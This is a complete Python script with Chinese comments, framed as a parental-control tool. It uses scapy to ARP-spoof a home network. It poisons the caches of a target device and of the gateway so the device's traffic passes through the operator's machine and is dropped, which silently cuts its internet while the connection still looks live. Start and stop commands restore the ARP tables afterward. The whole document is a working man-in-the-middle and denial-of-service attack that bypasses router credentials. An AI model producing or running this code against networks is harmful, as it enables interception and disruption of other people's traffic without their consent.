#!/usr/bin/env python3
"""
通过 ARP 欺骗控制小孩设备网络。不需要路由器密码，不需要碰小孩设备。

原理：假冒网关，让小孩设备的所有流量经过本机并丢弃。

用法:
  python net_control.py start   开启限速（Ctrl+C 停止恢复）
  python net_control.py stop    恢复网络

双击 limit.bat / release.bat 即可一键切换。
"""

import json
import os
import sys
import time
from scapy.all import Ether, ARP, srp1, sendp, get_if_hwaddr, conf

# ====== 请修改下面的 IP 地址 ======
CHILD_IP = "192.168.31.38"     # 小孩设备的 IP
MY_IP = "192.168.31.15"        # 你电脑的 IP
GATEWAY_IP = "192.168.31.1"     # 路由器网关 IP
# =================================

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
STATE_FILE = os.path.join(SCRIPT_DIR, ".net_control.dat")
PID_FILE = os.path.join(SCRIPT_DIR, ".net_control.pid")
conf.verb = 0


class NetController:
    def __init__(self):
        self.iface = conf.iface
        self.my_mac = get_if_hwaddr(self.iface)
        self.child_mac = None
        self.gateway_mac = None
        self.running = False

    def resolve_mac(self, ip):
        result = srp1(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=3, verbose=0
        )
        return result[Ether].src if result else None

    def send_arp(self, dst_mac, dst_ip, src_mac, src_ip):
        pkt = Ether(dst=dst_mac) / ARP(
            op=2, hwsrc=src_mac, psrc=src_ip,
            hwdst=dst_mac, pdst=dst_ip
        )
        sendp(pkt, iface=self.iface, verbose=0)

    def spoof(self):
        self.send_arp(self.child_mac, CHILD_IP, self.my_mac, GATEWAY_IP)
        self.send_arp(self.gateway_mac, GATEWAY_IP, self.my_mac, CHILD_IP)

    def restore(self):
        self.send_arp(self.child_mac, CHILD_IP, self.gateway_mac, GATEWAY_IP)
        self.send_arp(self.gateway_mac, GATEWAY_IP, self.child_mac, CHILD_IP)
        time.sleep(0.3)
        self.send_arp(self.child_mac, CHILD_IP, self.gateway_mac, GATEWAY_IP)
        self.send_arp(self.gateway_mac, GATEWAY_IP, self.child_mac, CHILD_IP)

    def save_state(self):
        with open(STATE_FILE, "w") as f:
            json.dump({
                "child_mac": self.child_mac,
                "gateway_mac": self.gateway_mac,
                "my_mac": self.my_mac,
            }, f)

    def load_state(self):
        with open(STATE_FILE) as f:
            state = json.load(f)
            self.child_mac = state["child_mac"]
            self.gateway_mac = state["gateway_mac"]
            self.my_mac = state["my_mac"]


    def run(self):
        print("正在解析 MAC 地址...")
        self.child_mac = self.resolve_mac(CHILD_IP)
        self.gateway_mac = self.resolve_mac(GATEWAY_IP)

        if not self.child_mac:
            print(f"[错误] 找不到小孩设备 {CHILD_IP}")
            print("  请确认：1) 设备已开机联网  2) IP 地址正确")
            input("按 Enter 退出...")
            return

        if not self.gateway_mac:
            print(f"[错误] 找不到网关 {GATEWAY_IP}")
            input("按 Enter 退出...")
            return

        self.save_state()
        with open(PID_FILE, "w") as f:
            f.write(str(os.getpid()))

        print(f"小孩设备: {CHILD_IP} -> {self.child_mac}")
        print(f"网关:     {GATEWAY_IP} -> {self.gateway_mac}")
        print(f"本机:     {MY_IP} -> {self.my_mac}")
        print()
        print("限速已开启！小孩设备网络已被限制")
        print("  WiFi/网线仍显示已连接，但无法上网")
        print()
        print("按 Ctrl+C 或双击 release.bat 恢复")
        print("-" * 40)

        self.running = True
        try:
            while self.running:
                self.spoof()
                time.sleep(2)
        except KeyboardInterrupt:
            pass
        finally:
            self.restore()
            self.running = False
            for f in [STATE_FILE, PID_FILE]:
                if os.path.exists(f):
                    os.remove(f)
            print("网络已恢复正常！")


def cmd_stop():
    if not os.path.exists(STATE_FILE):
        print("未发现正在运行的限速进程")
        return

    ctrl = NetController()
    ctrl.load_state()
    ctrl.restore()
    print("ARP 表已恢复")

    if os.path.exists(PID_FILE):
        with open(PID_FILE) as f:
            pid = f.read().strip()
        if pid:
            os.system(f"taskkill /F /PID {pid} >nul 2>&1")
        for f in [STATE_FILE, PID_FILE]:
            if os.path.exists(f):
                os.remove(f)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "stop":
        cmd_stop()
    else:
        NetController().run()
